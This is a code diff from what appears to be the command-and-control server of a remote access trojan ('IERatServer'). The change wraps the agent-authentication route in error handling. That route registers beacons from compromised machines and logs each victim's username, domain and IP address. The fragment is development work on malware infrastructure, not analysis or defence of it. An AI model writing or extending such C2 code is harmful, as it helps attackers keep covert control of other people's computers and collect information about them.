@@ -63,30 +63,36 @@ namespace IERatServer
             {
                 Console.WriteLine("\nError - " + ex.Message);
             }
-
         }
 
         [StaticRoute(HttpMethod.POST, "/api/v1/auth")]
         public static async Task AuthRoute(HttpContext ctx)
         {
-            ctx.Response.StatusCode = 200;
-            Agent beacon = ctx.Request.DataAsJsonObject<Agent>();
-            ResponseObject responseObject = new()
+            try
             {
-                Type = "NewAgent",
-                Task = null,
-                Notes = "Ok",
-            };
-            if (!Db.AgentExists(beacon.ID)) 
-            {
-                responseObject.Notes = "Authenticated";
-                Db.NewAgentChannel(beacon, ctx.Request.Source.IpAddress);
-                Console.ForegroundColor = ConsoleColor.Blue;
-                Console.WriteLine($"\nNew agent connection received from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]\n");
-                Console.ForegroundColor = ConsoleColor.White;
+                ctx.Response.StatusCode = 200;
+                Agent beacon = ctx.Request.DataAsJsonObject<Agent>();
+                ResponseObject responseObject = new()
+                {
+                    Type = "NewAgent",
+                    Task = null,
+                    Notes = "Ok",
+                };
+                if (!Db.AgentExists(beacon.ID))
+                {
+                    responseObject.Notes = "Authenticated";
+                    Db.NewAgentChannel(beacon, ctx.Request.Source.IpAddress);
+                    Console.ForegroundColor = ConsoleColor.Blue;
+                    Console.WriteLine($"\nNew agent connection received from {beacon.Username}@{beacon.Domain} [{ctx.Request.Source.IpAddress}]\n");
+                    Console.ForegroundColor = ConsoleColor.White;
+                }
+                var responseString = JsonConvert.SerializeObject(responseObject);
+                await ctx.Response.Send(ServerUtils.GenerateResponse(responseString));
             }
-            var responseString = JsonConvert.SerializeObject(responseObject);
-            await ctx.Response.Send(ServerUtils.GenerateResponse(responseString));
+            catch (Exception ex)
+            {
+                Console.WriteLine("\nError - " + ex.Message);
+            }
         }
         static async Task DefaultRoute(HttpContext ctx)
         {
